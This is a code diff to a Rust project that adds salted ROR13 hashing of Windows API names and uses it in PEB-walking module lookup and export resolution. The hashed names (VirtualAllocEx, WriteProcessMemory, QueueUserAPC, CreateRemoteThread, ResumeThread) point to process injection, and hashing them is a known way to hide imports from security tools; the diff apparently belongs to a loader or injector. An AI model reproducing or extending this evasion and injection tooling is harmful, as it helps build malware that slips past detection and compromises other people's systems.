@@ -3,6 +3,40 @@
 use std::{mem, ptr};
 use std::arch::asm;
 
+include!(concat!(env!("OUT_DIR"), "/api_hash_salt.rs"));
+
+pub const fn ror13(name: &[u8]) -> u32 {
+    let mut hash: u32 = 0;
+    let mut i = 0;
+    while i < name.len() {
+        hash = (hash >> 13) | (hash << (32 - 13));
+        hash = hash.wrapping_add(name[i] as u32);
+        i += 1;
+    }
+    hash
+}
+
+pub const fn api_hash(name: &[u8]) -> u32 {
+    ror13(name) ^ HASH_SALT
+}
+
+// ── Module hashes (PEB walk) ──────────────────────────────────────────────────
+pub const H_KERNEL32: u32 = api_hash(b"kernel32.dll");
+
+// ── Export hashes (dynapi.rs) ─────────────────────────────────────────────────
+pub const H_LoadLibraryA:            u32 = api_hash(b"LoadLibraryA");
+pub const H_GetProcAddress:          u32 = api_hash(b"GetProcAddress");
+pub const H_VirtualAllocEx:          u32 = api_hash(b"VirtualAllocEx");
+pub const H_VirtualFreeEx:           u32 = api_hash(b"VirtualFreeEx");
+pub const H_WriteProcessMemory:      u32 = api_hash(b"WriteProcessMemory");
+pub const H_QueueUserAPC:            u32 = api_hash(b"QueueUserAPC");
+pub const H_ResumeThread:            u32 = api_hash(b"ResumeThread");
+pub const H_CreateProcessW:          u32 = api_hash(b"CreateProcessW");
+pub const H_WaitForSingleObject:     u32 = api_hash(b"WaitForSingleObject");
+pub const H_VirtualProtect:          u32 = api_hash(b"VirtualProtect");
+pub const H_CreateRemoteThread:      u32 = api_hash(b"CreateRemoteThread");
+pub const H_SetEnvironmentVariableW: u32 = api_hash(b"SetEnvironmentVariableW");
+
 #[repr(C)]
 #[derive(Clone, Copy)]
 pub struct OBJECT_ATTRIBUTES {
@@ -177,25 +211,23 @@ pub fn get_module_base_by_hash(target_hash: u32) -> Option<*mut u8> {
         loop {
             let dll_base = *(entry.add(0x30) as *const *mut u8);
             let name_ptr = *(entry.add(0x60) as *const *mut u16);
-            let mut name_buf = [0u16; 64];
+            // Hash the UNICODE_STRING BaseDllName as lowercase ASCII bytes using ROR13+salt.
+            let mut ascii_buf = [0u8; 64];
             let mut idx = 0;
             while idx < 64 {
                 let c = *name_ptr.add(idx);
                 if c == 0 { break; }
-                name_buf[idx] = c;
+                // lowercase: add 0x20 if uppercase ASCII letter
+                let b = (c & 0xFF) as u8;
+                ascii_buf[idx] = if b >= b'A' && b <= b'Z' { b + 0x20 } else { b };
                 idx += 1;
             }
-            let ascii_buf: Vec<u8> = name_buf[..idx].iter().map(|&c| (c & 0xFF) as u8).collect();
-            let mut hash: u32 = 0;
-            for &b in &ascii_buf {
-                if b == 0 { break; }
-                hash = hash.wrapping_mul(31).wrapping_add(b as u32);
-            }
+            let hash = ror13(&ascii_buf[..idx]) ^ HASH_SALT;
             if hash == target_hash {
                 return Some(dll_base);
             }
             let next = *(entry as *const *mut u8);
-            if next == head { break; }
+            if next == head || next.is_null() { break; }
             entry = next;
         }
         None
@@ -302,14 +334,11 @@ pub fn resolve_export_by_hash(dll_base: *mut u8, target_hash: u32) -> Option<*mu
         for i in 0..num_names {
             let name_rva = core::ptr::read_unaligned(names.add(i as usize));
             let name_ptr = dll_base.add(name_rva as usize);
-            let mut hash: u32 = 0;
-            let mut k = 0;
-            loop {
-                let b = *name_ptr.add(k);
-                if b == 0 { break; }
-                hash = hash.wrapping_mul(31).wrapping_add(b as u32);
-                k += 1;
-            }
+            // Measure the export name length, then hash with ROR13+salt.
+            let mut len = 0usize;
+            while *name_ptr.add(len) != 0 { len += 1; }
+            let name_slice = core::slice::from_raw_parts(name_ptr, len);
+            let hash = ror13(name_slice) ^ HASH_SALT;
             if hash == target_hash {
                 let ord = *ordinals.add(i as usize) as usize;
                 if ord >= num_funcs as usize { return None; }
